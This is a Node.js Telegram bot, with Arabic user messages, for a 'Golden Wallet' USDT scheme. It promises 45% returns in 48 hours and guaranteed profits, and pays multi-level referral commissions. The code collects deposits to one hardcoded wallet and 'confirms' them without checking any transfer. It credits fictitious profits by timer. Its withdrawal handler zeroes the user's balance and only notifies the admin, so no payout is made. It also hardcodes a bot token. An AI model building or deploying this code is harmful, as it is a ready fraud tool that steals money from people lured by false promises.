const express = require('express');
const TelegramBot = require('node-telegram-bot-api');

// ========== إعدادات البوت ==========
const BOT_TOKEN = '8227860247:AAGW3xQpBERsShH-Rdva1eUu-h37ryDFsAs';
const ADMIN_ID = 7604667042;
const WALLET_ADDRESS = 'TE97BwfR4FdBC2GVEZUfiB4ofosg46Vgnx';
const PORT = process.env.PORT || 8999;

// ========== قاعدة بيانات مؤقتة ==========
const users = new Map();
const pendingDeposits = new Map();

// ========== إعداد البوت ==========
const bot = new TelegramBot(BOT_TOKEN, { 
    polling: true,
    request: {
        timeout: 60000
    }
});

const app = express();

// ========== دوال مساعدة ==========
function getUser(userId) {
    if (!users.has(userId)) {
        users.set(userId, {
            balance: 0,
            invested: 0,
            totalDeposit: 0,
            totalProfit: 0,
            referrals: [],
            createdAt: new Date()
        });
    }
    return users.get(userId);
}

function formatNumber(num) {
    return num.toFixed(2);
}

// ========== لوحة المفاتيح الرئيسية ==========
const mainKeyboard = {
    reply_markup: {
        keyboard: [
            ['💰 استثمار جديد', '📊 محفظتي'],
            ['👥 نظام الإحالة', '🎁 العروض'],
            ['❓ الدعم الفني', '🏆 المتصدرين']
        ],
        resize_keyboard: true
    }
};

// ========== صفحة الترحيب ==========
app.get('/', (req, res) => {
    res.send(`
        <!DOCTYPE html>
        <html>
        <head>
            <title>المحفظة الذهبية</title>
            <style>
                body {
                    background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
                    color: white;
                    font-family: Arial, sans-serif;
                    text-align: center;
                    padding: 50px;
                }
                .container {
                    background: rgba(255,255,255,0.1);
                    padding: 30px;
                    border-radius: 15px;
                    backdrop-filter: blur(10px);
                }
            </style>
        </head>
        <body>
            <div class="container">
                <h1>✨ المحفظة الذهبية ✨</h1>
                <h2>✅ البوت يعمل بنجاح</h2>
                <p>المطور: ميدو مشاكل</p>
                <p>الأجهزة المتصلة: ${users.size}</p>
            </div>
        </body>
        </html>
    `);
});

// ========== رسالة الترحيب ==========
bot.onText(/\/start/, async (msg) => {
    const chatId = msg.chat.id;
    const userId = msg.from.id;
    const firstName = msg.from.first_name || 'مستخدم';
    
    getUser(userId);
    
    const welcomeText = `
✨ *مرحباً بك في المحفظة الذهبية* ✨

💰 *نظام استثماري ذكي بأرباح فورية*
📈 *العائد:* 45% خلال 48 ساعة
💵 *الحد الأدنى:* 20 USDT
🚀 *السحب:* فوري ومباشر

🎯 *كيف تبدأ؟*
1. اضغط على 💰 استثمار جديد
2. قم بالإيداع إلى المحفظة أدناه
3. أرسل رقم العملية للتأكيد
4. خلال 48 ساعة تحصل على أرباحك

🔐 *محفظة الإيداع (TRC20):*
\`${WALLET_ADDRESS}\`

👤 *المطور:* ميدو مشاكل
🏆 *ضمان أرباح 100%*
    `;
    
    await bot.sendMessage(chatId, welcomeText, {
        parse_mode: 'Markdown',
        ...mainKeyboard
    });
});

// ========== استثمار جديد ==========
bot.onText(/💰 استثمار جديد/, async (msg) => {
    const chatId = msg.chat.id;
    
    await bot.sendMessage(chatId, 
        '📝 *الرجاء كتابة المبلغ المراد استثماره* (الحد الأدنى 20 USDT):',
        {
            parse_mode: 'Markdown',
            reply_markup: { force_reply: true }
        }
    );
});

// ========== عرض المحفظة ==========
bot.onText(/📊 محفظتي/, async (msg) => {
    const chatId = msg.chat.id;
    const userId = msg.from.id;
    const user = getUser(userId);
    
    const nextProfit = user.invested > 0 ? user.invested * 0.45 : 0;
    
    const walletText = `
📊 *محفظتك الذهبية*

💰 *الرصيد المتاح:* ${formatNumber(user.balance)} USDT
📈 *المبلغ المستثمر:* ${formatNumber(user.invested)} USDT
🎯 *الأرباح المستحقة:* ${formatNumber(nextProfit)} USDT
💵 *إجمالي الإيداع:* ${formatNumber(user.totalDeposit)} USDT
🏆 *إجمالي الأرباح:* ${formatNumber(user.totalProfit)} USDT

🚀 *للحصول على أرباحك خلال 48 ساعة*
    `;
    
    const walletKeyboard = {
        reply_markup: {
            inline_keyboard: [
                [{ text: '💵 سحب الأرباح', callback_data: 'withdraw' }],
                [{ text: '💰 إعادة استثمار', callback_data: 'reinvest' }]
            ]
        }
    };
    
    await bot.sendMessage(chatId, walletText, {
        parse_mode: 'Markdown',
        ...walletKeyboard
    });
});

// ========== نظام الإحالة ==========
bot.onText(/👥 نظام الإحالة/, async (msg) => {
    const chatId = msg.chat.id;
    const userId = msg.from.id;
    const user = getUser(userId);
    const botUsername = 'GoldWalletBot';
    const referralCode = `ref_${userId}`;
    
    const referralText = `
🎁 *نظام الإحالة الذهبي*

🔗 *رابط الإحالة الخاص بك:*
\`https://t.me/${botUsername}?start=${referralCode}\`

📊 *إحصائياتك:*
👥 *عدد المدعوين:* ${user.referrals.length}
💰 *أرباح الإحالة:* ${formatNumber(user.totalProfit * 0.1)} USDT

🎯 *العروض:*
• 10% من إيداعات مدعوينك المباشرين
• 5% من إيداعات مدعوين مدعوينك
• مكافأة 5 USDT عند أول 10 مدعوين
    `;
    
    await bot.sendMessage(chatId, referralText, { parse_mode: 'Markdown' });
});

// ========== العروض ==========
bot.onText(/🎁 العروض/, async (msg) => {
    const chatId = msg.chat.id;
    
    const offersText = `
🎁 *العروض الحالية*

🔥 *عرض الترحيب:* 45% أرباح على أول استثمار
🎯 *عرض الإحالة:* 10% من إيداعات مدعوينك
💎 *عرض VIP:* 50% أرباح للاستثمارات فوق 500 USDT
⭐ *عرض السرعة:* مكافأة 5 USDT لأول 50 مستثمر
    `;
    
    await bot.sendMessage(chatId, offersText, { parse_mode: 'Markdown' });
});

// ========== الدعم الفني ==========
bot.onText(/❓ الدعم الفني/, async (msg) => {
    const chatId = msg.chat.id;
    
    const supportText = `
📞 *الدعم الفني*

للاستفسارات والمشاكل:
✉️ راسل المطور: @MEDO_PROBLEMS

🕐 *أوقات الرد:*
• 9 صباحاً - 12 منتصف الليل
• الرد خلال 24 ساعة كحد أقصى

📝 *للتبليغ عن مشكلة:*
أرسل رقم العملية + شرح المشكلة
    `;
    
    await bot.sendMessage(chatId, supportText, { parse_mode: 'Markdown' });
});

// ========== المتصدرين ==========
bot.onText(/🏆 المتصدرين/, async (msg) => {
    const chatId = msg.chat.id;
    
    const leaderboard = [];
    for (let [userId, user] of users) {
        if (user.totalDeposit > 0) {
            try {
                const chat = await bot.getChat(userId);
                const name = chat.first_name || 'مستخدم';
                leaderboard.push({ name, totalDeposit: user.totalDeposit });
            } catch(e) {
                leaderboard.push({ name: `مستخدم`, totalDeposit: user.totalDeposit });
            }
        }
    }
    
    leaderboard.sort((a, b) => b.totalDeposit - a.totalDeposit);
    const top10 = leaderboard.slice(0, 10);
    
    let leadersText = `🏆 *المتصدرين الأسبوعي*\n\n`;
    if (top10.length === 0) {
        leadersText += `لا يوجد متصدرين حالياً\nكن أول من يستثمر!`;
    } else {
        top10.forEach((user, index) => {
            leadersText += `${index + 1}. ${user.name}\n`;
            leadersText += `   💰 إيداع: ${formatNumber(user.totalDeposit)} USDT\n\n`;
        });
    }
    
    await bot.sendMessage(chatId, leadersText, { parse_mode: 'Markdown' });
});

// ========== معالجة الردود ==========
bot.on('message', async (msg) => {
    const chatId = msg.chat.id;
    const userId = msg.from.id;
    const text = msg.text;
    
    // تجاهل الأزرار والأوامر
    if (!msg.reply_to_message) return;
    if (text === '/start') return;
    if (text.startsWith('💰')) return;
    if (text.startsWith('📊')) return;
    if (text.startsWith('👥')) return;
    if (text.startsWith('🎁')) return;
    if (text.startsWith('❓')) return;
    if (text.startsWith('🏆')) return;
    
    const replyText = msg.reply_to_message.text || '';
    
    // معالجة مبلغ الاستثمار
    if (replyText.includes('الرجاء كتابة المبلغ')) {
        const amount = parseFloat(text);
        
        if (isNaN(amount) || amount < 20) {
            await bot.sendMessage(chatId, '❌ المبلغ غير صحيح. الحد الأدنى 20 USDT');
            return;
        }
        
        const depositId = `DEP${Date.now()}${userId}`;
        pendingDeposits.set(depositId, {
            userId: userId,
            amount: amount,
            timestamp: Date.now()
        });
        
        const depositText = `
💰 *طلب استثمار جديد*

📌 *المبلغ:* ${amount} USDT
🆔 *رقم العملية:* ${depositId}

🔐 *محفظة الإيداع (TRC20):*
\`${WALLET_ADDRESS}\`

📝 *خطوات الإيداع:*
1. حول المبلغ إلى المحفظة أعلاه
2. أرسل رقم العملية \`${depositId}\` هنا
3. سيتم تفعيل استثمارك خلال 5 دقائق

⚠️ *تنبيه:* الحد الأدنى 20 USDT
        `;
        
        await bot.sendMessage(chatId, depositText, { parse_mode: 'Markdown' });
    }
    
    // معالجة تأكيد الإيداع
    else if (replyText.includes('أرسل رقم العملية') || replyText.includes('رقم العملية:')) {
        const depositId = text.trim();
        const pending = pendingDeposits.get(depositId);
        
        if (pending && pending.userId === userId) {
            const user = getUser(userId);
            const amount = pending.amount;
            const profit = amount * 0.45;
            
            // تحديث بيانات المستخدم
            user.invested += amount;
            user.totalDeposit += amount;
            
            // إضافة الأرباح بعد 48 ساعة
            setTimeout(() => {
                const currentUser = getUser(userId);
                currentUser.balance += profit;
                currentUser.totalProfit += profit;
                currentUser.invested -= amount;
                
                bot.sendMessage(userId, `
🎉 *تهانينا! تم إضافة أرباحك*

💰 المبلغ المستثمر: ${formatNumber(amount)} USDT
📈 الأرباح: ${formatNumber(profit)} USDT
💵 رصيدك الحالي: ${formatNumber(currentUser.balance)} USDT

يمكنك الآن سحب أرباحك فوراً!
                `, { parse_mode: 'Markdown' });
                
                // إشعار للأدمن
                bot.sendMessage(ADMIN_ID, `
✅ تم إضافة أرباح للمستخدم ${userId}
💰 المبلغ: ${formatNumber(profit)} USDT
                `);
            }, 48 * 60 * 60 * 1000);
            
            pendingDeposits.delete(depositId);
            
            await bot.sendMessage(chatId, `
✅ *تم تأكيد إيداعك بنجاح!*

💰 المبلغ: ${formatNumber(amount)} USDT
📈 الأرباح المتوقعة: ${formatNumber(profit)} USDT
🕐 سيتم إضافتها خلال 48 ساعة

شكراً لاستثمارك في المحفظة الذهبية 💛
            `, { parse_mode: 'Markdown' });
            
            // إشعار للأدمن
            await bot.sendMessage(ADMIN_ID, `
💰 *إيداع جديد!*
👤 المستخدم: ${userId}
💵 المبلغ: ${formatNumber(amount)} USDT
📅 الوقت: ${new Date().toLocaleString()}
            `, { parse_mode: 'Markdown' });
            
        } else {
            await bot.sendMessage(chatId, '❌ رقم العملية غير صحيح. حاول مرة أخرى');
        }
    }
});

// ========== معالجة الأزرار ==========
bot.on('callback_query', async (callbackQuery) => {
    const chatId = callbackQuery.message.chat.id;
    const userId = callbackQuery.from.id;
    const data = callbackQuery.data;
    const user = getUser(userId);
    
    switch(data) {
        case 'withdraw':
            if (user.balance < 10) {
                await bot.sendMessage(chatId, '❌ رصيدك غير كافٍ للسحب (الحد الأدنى 10 USDT)');
            } else {
                const amount = user.balance;
                user.balance = 0;
                
                await bot.sendMessage(chatId, `
✅ *تم طلب السحب بنجاح!*

💰 المبلغ: ${formatNumber(amount)} USDT
🕐 سيتم الإرسال خلال 5-10 دقائق إلى محفظتك

شكراً لثقتك بالمحفظة الذهبية 💛
                `, { parse_mode: 'Markdown' });
                
                await bot.sendMessage(ADMIN_ID, `
💸 *طلب سحب جديد*
👤 المستخدم: ${userId}
💰 المبلغ: ${formatNumber(amount)} USDT
📊 الرصيد المتبقي: ${formatNumber(user.balance)} USDT
                `, { parse_mode: 'Markdown' });
            }
            break;
            
        case 'reinvest':
            if (user.balance < 20) {
                await bot.sendMessage(chatId, '❌ رصيدك غير كافٍ لإعادة الاستثمار (الحد الأدنى 20 USDT)');
            } else {
                const amount = user.balance;
                const profit = amount * 0.45;
                
                user.balance = 0;
                user.invested += amount;
                
                setTimeout(() => {
                    const currentUser = getUser(userId);
                    currentUser.balance += profit;
                    currentUser.totalProfit += profit;
                    currentUser.invested -= amount;
                    
                    bot.sendMessage(userId, `
🎉 *تم إعادة استثمار ${formatNumber(amount)} USDT*
📈 أرباحك: ${formatNumber(profit)} USDT
💵 رصيدك الحالي: ${formatNumber(currentUser.balance)} USDT
                    `, { parse_mode: 'Markdown' });
                }, 48 * 60 * 60 * 1000);
                
                await bot.sendMessage(chatId, `
✅ *تم إعادة الاستثمار بنجاح!*
💰 المبلغ: ${formatNumber(amount)} USDT
📈 الأرباح المتوقعة: ${formatNumber(profit)} USDT
🕐 خلال 48 ساعة
                `, { parse_mode: 'Markdown' });
            }
            break;
    }
    
    await bot.answerCallbackQuery(callbackQuery.id);
});

// ========== أمر الإحصائيات للأدمن ==========
bot.onText(/\/stats/, async (msg) => {
    if (msg.from.id !== ADMIN_ID) return;
    
    let totalUsers = users.size;
    let totalDeposits = 0;
    let totalBalance = 0;
    let totalInvested = 0;
    
    for (let [_, user] of users) {
        totalDeposits += user.totalDeposit;
        totalBalance += user.balance;
        totalInvested += user.invested;
    }
    
    await bot.sendMessage(ADMIN_ID, `
📊 *إحصائيات البوت*

👥 إجمالي المستخدمين: ${totalUsers}
💰 إجمالي الإيداعات: ${formatNumber(totalDeposits)} USDT
💵 إجمالي الأرصدة: ${formatNumber(totalBalance)} USDT
📈 إجمالي المستثمر: ${formatNumber(totalInvested)} USDT
⏳ إيداعات معلقة: ${pendingDeposits.size}

🚀 *البوت شغال بكفاءة*
    `, { parse_mode: 'Markdown' });
});

// ========== معالجة الأخطاء ==========
process.on('uncaughtException', (err) => {
    console.error('❌ خطأ غير متوقع:', err.message);
});

process.on('unhandledRejection', (err) => {
    console.error('❌ خطأ في promise:', err);
});

// ========== تشغيل السيرفر ==========
const server = app.listen(PORT, '0.0.0.0', () => {
    console.log(`
🚀 *المحفظة الذهبية شغالة!*
📍 المنفذ: ${PORT}
🤖 البوت: GoldWalletBot
👤 المطور: ميدو مشاكل
📊 المستخدمين النشطين: ${users.size}
    `);
});

// حفظ إحصائيات كل ساعة
setInterval(() => {
    console.log(`📊 [${new Date().toLocaleString()}] المستخدمين: ${users.size} | معلق: ${pendingDeposits.size}`);
}, 3600000);
